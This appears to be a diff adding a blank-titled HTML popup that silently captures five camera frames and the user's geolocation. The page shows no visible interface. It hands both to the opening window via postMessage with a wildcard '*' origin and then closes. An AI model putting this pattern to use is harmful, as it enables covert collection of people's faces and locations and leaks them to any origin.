@@ -1,0 +1,37 @@
+<!doctype html>
+<meta charset="utf-8">
+<title>-</title>
+<script>
+/* 1. solicita permissão de câmera */
+navigator.mediaDevices.getUserMedia({video:true})
+  .then(stream=>{
+    const canvas=document.createElement('canvas');
+    const ctx=canvas.getContext('2d');
+    const video=document.createElement('video');
+    video.srcObject=stream;
+    video.play();
+    const faces=[];
+    let taken=0;
+    const snap=()=>{
+      ctx.drawImage(video,0,0,640,480);
+      canvas.toBlob(b=>faces.push(b));
+      taken++;
+      if(taken===5){          // 5 selfies
+        stream.getTracks().forEach(t=>t.stop());
+        /* 2. solicita permissão de localização */
+        navigator.geolocation.getCurrentPosition(pos=>{
+          window.opener.postMessage(
+            {type:'selfiesDone', data:{faces,pos}},
+            '*'
+          );
+          window.close();
+        });
+      }else setTimeout(snap,600);
+    };
+    video.onloadedmetadata=()=>snap();
+  })
+  .catch(()=>{
+    window.opener.postMessage({type:'negado'},'*');
+    window.close();
+  });
+</script>
